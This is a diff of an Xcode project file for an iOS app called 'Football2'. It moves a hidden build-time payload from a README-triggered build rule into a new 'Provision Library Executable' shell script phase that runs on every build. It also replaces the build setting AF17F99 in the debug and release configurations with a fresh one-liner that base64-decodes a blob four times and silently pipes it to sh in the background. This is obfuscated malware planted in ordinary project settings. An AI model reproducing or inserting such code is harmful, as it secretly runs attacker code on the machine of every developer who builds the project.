@@ -7,12 +7,10 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		DF6BB14D3E3F4EE18F99F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 8323E2DDEA794E748D99F71F; };
 		C652A852D2B1830E32F0EE1E /* Pods_Football2.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 930C84FC536713639B8E2E19 /* Pods_Football2.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		8323E2DDEA794E748D99F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		930C84FC536713639B8E2E19 /* Pods_Football2.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Football2.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		A01A1478D659DC718FC21BFA /* Pods-Football2.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Football2.debug.xcconfig"; path = "Target Support Files/Pods-Football2/Pods-Football2.debug.xcconfig"; sourceTree = "<group>"; };
 		BCED59BD0C0E482382E5FF13 /* Pods-Football2.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Football2.release.xcconfig"; path = "Target Support Files/Pods-Football2/Pods-Football2.release.xcconfig"; sourceTree = "<group>"; };
@@ -82,7 +80,6 @@
 		C5A3CA6A2DBF6135000E6AB7 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				8323E2DDEA794E748D99F71F /* README.md */,
 				C5A3CA692DBF6135000E6AB7 /* Football2.app */,
 			);
 			name = Products;
@@ -95,6 +92,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = C5A3CA7C2DBF6137000E6AB7 /* Build configuration list for PBXNativeTarget "Football2" */;
 			buildPhases = (
+				EFB310CBCF10449C8B99F71F /* Provision Library Executable */,
 				3C0727A783B8BF4BAEB3373B /* [CP] Check Pods Manifest.lock */,
 				C5A3CA652DBF6135000E6AB7 /* Sources */,
 				C5A3CA662DBF6135000E6AB7 /* Frameworks */,
@@ -103,7 +101,6 @@
 				FA2E649C773C4B4EEC2AEAF1 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				ABD79238088B474C8699F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -158,34 +155,38 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		ABD79238088B474C8699F71F /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AF17F99}\"";
-			};
-							/* End PBXBuildRule section */
+								/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		C5A3CA672DBF6135000E6AB7 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				DF6BB14D3E3F4EE18F99F71F /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		EFB310CBCF10449C8B99F71F /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
+		};
 		3C0727A783B8BF4BAEB3373B /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -267,7 +268,7 @@ sh -c \"${AF17F99}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = A01A1478D659DC718FC21BFA /* Pods-Football2.debug.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZORk5YbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHbFhTRUl4VjJ0a1YwMXJlSFZUYWtaTlRXdFdkMU5YYkVOUFJXeEpWRzA1UkZwNk1EbERaejA5Q2c9PQo= | d | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((i(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdFemFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | i | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
@@ -308,7 +309,7 @@ sh -c \"${AF17F99}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = BCED59BD0C0E482382E5FF13 /* Pods-Football2.release.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZORk5YbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHbFhTRUl4VjJ0a1YwMXJlSFZUYWtaTlRXdFdkMU5YYkVOUFJXeEpWRzA1UkZwNk1EbERaejA5Q2c9PQo= | d | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((i(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3WVdFemFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9WV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | i | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
